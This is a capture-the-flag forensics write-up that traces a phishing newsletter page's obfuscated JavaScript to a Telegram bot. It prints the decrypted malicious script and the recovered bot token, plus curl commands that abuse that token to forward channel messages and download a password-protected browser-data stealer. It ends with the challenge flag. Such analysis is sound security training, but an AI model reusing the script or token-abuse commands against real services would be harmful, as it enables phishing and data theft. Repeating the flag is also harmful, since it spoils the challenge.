# Cyber Apocalypse CTF 2025

## Tales for the Brave

> In Eldoria, a once-innocent website called “Tales for the Brave” has become the focus of unsettling rumors. Some claim it may secretly trap unsuspecting visitors, leading them into a complex phishing scheme. Investigators report signs of encrypted communications and stealthy data collection beneath its friendly exterior. You must uncover the truth, and protect Eldoria from a growing threat.
**When debugging JavaScript, ensure you use a Firefox-based browser.**
> 
> 

Tags: _forensics_

## Solution
The challenge only comes with a small webpage there users can subscribe to newsletters by entering `email`, a `description` and the newsletters they want to subscribe to. At least it seems like the page is offering this. Lets have a closer look.

![](img001.png)

In the page source we can see a javascript file is [`linked`](index.js). It's somewhat cryptic, but we can partially [`deobfuscate and beautify`](https://deobfuscate.io/) the source code. Resolving the string lookups manually leads to the following [`code`](stage1.js).

```js
var payload = "YvszwNxcUR9i8..."
var key = "2+2YbLGJoUeV8oqzF69MLbIHNynPVLyT"
var iv = "5HUmFMpKNy84CfzGDQkwig=="

console.log(CryptoJS['AES']['decrypt'](
        {
            ciphertext: CryptoJS['enc']['Base64']['parse'](payload)
        },
        CryptoJS['enc']['Base64']['parse'](key),
        {
            iv: CryptoJS['enc']['Base64']['parse'](iv)
        }
    ).toString(CryptoJS['enc']['Utf8']));
```

Great, this just decodes and decrypts the second stage payload. By doing this manually, and duming the output, we get another obfuscated javascript. So, the same procedure as before: beautify and some manual deobfuscation leads to the [`second stage`](stage2.js).

There are multiple things the script does. It adds change events to the checkboxes and tracks which boxes where checked in an array.

```js
var sequence = [];
  ;
  function l() {
    sequence.push(this.id);
  }
  ;
  ;
  var checkboxes = document.querySelectorAll("input[class=cb]");
  for (var i = 0; i < checkboxes.length; i++) {
    checkboxes[i].addEventListener("change", l);
  }
```

Also it adds a event listener to the `submit` event of `newsletterForm`. Here are some interesting things. The email is split at `@` and the first part seems to be used as a `specialKey`. The key and the description is passed to `f` function.

```js
document.getElementById('newsletterForm').addEventListener('submit', function (e) {
    e.preventDefault();
    const emailField = document.getElementById('email');
    const descriptionField = document.getElementById('descriptionField');
    let isValid = true;
    if (!emailField['value']) {
      emailField['classList']['add']('shake');
      isValid = false;
      setTimeout(() => {
        return emailField['classList']['remove']('shake');
      }, 500);
    }
    ;
    if (!isValid) {
      return;
    }
    ;
    const emailValue = emailField['value'];
    const specialKey = emailValue['split']('@')[0];
    const desc = parseInt(descriptionField['value'], 10);
    f(specialKey, desc);
  });
```

The `f` function checks if the special key equals `G('s3cur3k3y')`. We easily can run the function ourself to get the special key which is `0p3r4t10n_4PT_Un10n`. Secondly it creates a hash over the checkbox sequence and tests it against a given hash `d7ccf46c6b9835ee40b180b8b869693d3b34395874a93f82ff5922689e81dbdb`.

```js
function f(oferkfer, icd) {
    const channel_id = -1002496072246;
    var enc_token = "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==";
    if (oferkfer === G('s3cur3k3y') && CryptoJS.SHA256(sequence.join('')).toString(CryptoJS['enc']['Base64']) === '18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=') {
      var decrypted = CryptoJS['RC4Drop']['decrypt'](enc_token, CryptoJS['enc']['Utf8']['parse'](oferkfer), {drop: 192}).toString(CryptoJS['enc']['Utf8']);
      var HOST = 'https://api.telegram.org/bot' + decrypted;
      var xhr = new XMLHttpRequest;
      xhr['onreadystatechange'] = function () {
        if (xhr['readyState'] == XMLHttpRequest['DONE']) {
          const resp = JSON['parse'](xhr['responseText']);
          try {
            const link = resp['result']['text'];
            window['location']['replace'](link);
          } catch (error) {
            alert('Form submitted!');
          }
        }
      };
      xhr['open']('GET', HOST + '/' + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5');
      xhr['send'](null);
    } else {
      alert('Form submitted!');
    }
  }
```

Finding the correct sequence could be bruteforced, but we don't need to anyways, because it's just a client side check. The more important part is what happens afterwards. There is a encoded token that is [`RC4`](https://en.wikipedia.org/wiki/RC4) encoded with the special key as passphrase. We can decrypt the value with [`cyberchef`](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)RC4_Drop(%7B'option':'UTF8','string':'0p3r4t10n_4PT_Un10n'%7D,'Latin1','Latin1',192)&input=blppSWphWEFWdXpPNGFCQ2Y1ZVE1aWZRSTdyVUJJM3F5LzV0MERqZjBwRyt0Q0wzWTJiS0JDRklmM1RaMFE9PQ) and get `7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc` as a result.

The decrypted string is attached to `https://api.telegram.org/bot` so it seems to be a bot token that allows us to use the telegram [`API`](https://telegram-bot-sdk.readme.io/reference/). Especially the script invokes `https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id={icd}&from_chat_id=-1002496072246&message_id=5` which, according to the [`documentation`](https://telegram-bot-sdk.readme.io/reference/forwardmessage) `Use this method to forward messages of any kind.`. This is great, we can forward messages from one chat to another, we only have to find a chat-id that works for us.

So it's time to enumerate a bit. [`getUpdate`](https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/getUpdates) gives us a whole set of information to grind through. There are many chat id's and after some trial and error one can be found that allows the bot to forward messages to.

```bash
$ curl "https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=43390784&from_chat_id=-1002496072246&message_id=5"
{"ok":true,"result":{"message_id":11445,"from":{"id":7767830636,"is_bot":true,"first_name":"FreePalestine","username":"OperationEldoriaBot"},"chat":{"id":43390784,"first_name":"Safa","last_name":"Safari","username":"SafaSafari","type":"private"},"date":1742985112,"forward_origin":{"type":"channel","chat":{"id":-1002496072246,"title":"Operation Eldoria","type":"channel"},"message_id":5,"date":1735897128},"forward_from_chat":{"id":-1002496072246,"title":"Operation Eldoria","type":"channel"},"forward_from_message_id":5,"forward_date":1735897128,"text":"https://t.me/+_eYUKZwn-p45OGNk","entities":[{"offset":0,"length":30,"type":"url"}],"link_preview_options":{"is_disabled":true}}}
```

This looks great, the message text is a invite link to a telegram chat. Sadly the invite link expiered, but maybe we can see if we can forward other messages, by changing the message id. The full result can be seen [`here`](chat.txt), and the conversation is like this.

```
SafaSafari@Operation Eldoria (03.01.2025 10:28:07)
Operation Eldoria is progressing as planned. The dissidents are becoming too confident, thinking they are untouchable behind "secure" tools. As protestors, they have flocked to Brave because it's open source, but that might cost them their privacy.

SafaSafari@Operation Eldoria (03.01.2025 10:34:47)
Interesting. Their reliance on Brave works in our favor. Send over the tool and a brief summary of its capabilities.

SafaSafari@Operation Eldoria (03.01.2025 10:37:17)
Oh! We should not forget to send the invitation link for this channel to the website so the rest of the parties can join. Coordination is key, and they’ll need access to our updates and tools like Brave.

SafaSafari@Operation Eldoria (03.01.2025 10:38:48)
https://t.me/+_eYUKZwn-p45OGNk

SafaSafari@Operation Eldoria (03.01.2025 10:40:26)
Send Document Brave.zip

SafaSafari@Operation Eldoria (03.01.2025 10:41:22)
This is the tool. Details:

- Targets only Brave Browser users.
- Exfiltrates the browser's local storage.
- Operates silently and deletes traces upon execution.

SafaSafari@Operation Eldoria (03.01.2025 10:41:47)
Please send over the archive password.

SafaSafari@Operation Eldoria (03.01.2025 10:42:53)
Oh, yes! It is dr4g0nsh34rtb3l0ngst0m4l4k4r

SafaSafari@Operation Eldoria (03.01.2025 10:45:16)
I finished reviewing it. Looks promising! I will let my contacts know so they start distributing it. Let the operation begin!

SafaSafari@Operation Eldoria (03.01.2025 10:47:09)
For Lord Malakar! ⚔️
```

Very well, we can download the file by using the provided file id (not visible in the chat, but in the json payload), by invoking the [`getFile`](https://telegram-bot-sdk.readme.io/reference/getfile) endpoint of the telegram api.

```bash
curl "https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/getFile?file_id=BQACAgQAAyEFAASUxwo2AAMGZ93ttKcc24vGEJPqqIstCeH-0rgAAs4YAALNMcBT0DBTt6JgX1k2BA"
{"ok":true,"result":{"file_id":"BQACAgQAAyEFAASUxwo2AAMGZ93ttKcc24vGEJPqqIstCeH-0rgAAs4YAALNMcBT0DBTt6JgX1k2BA","file_unique_id":"AgADzhgAAs0xwFM","file_size":1190367,"file_path":"documents/file_0.zip"}}

curl "https://api.telegram.org/file/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/documents/file_0.zip" --output file_0.zip
```

The [`file`](file_0.zip) is zip archive secured with a password. The password was dropped in the chat, so we can just extract the file. It's called `Brave.exe` and the chat suggests it's a stealer for [`Brave Browser`](https://brave.com/) data. Quickly analyzing the file with [`https://any.run/`](AnyRun) or [`VIRUSTOTAL`](http://virustotal.com/) shows nothing too exciting, except there are some DNS requests to a `zolsc2s65u.htb` domain.

This means, that the tools maybe tries to exfiltrate data but is not successful resolving the domain. This can be fixed of course be setting up a local testbed in a VM and adding the domain to `hosts` so the application can resolve the name successfully. Capturing traffic locally finds a `HTTP` post request being sent. Although the flag was not present in the data sent. After some trial and error, the `JWT` token had a `auth` field that looks slightly suspicious like `base64` encoded data: `U0ZSQ2UwRlFWRjlqTUc1emNERnlOR014TTNOZllqTm9NVzVrWDJJemJqRm5ibDlzTURCck1XNW5YM014ZEROemZRPT0=`. And indeed, decoding it (twice) gives the flag.

Flag: `HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}`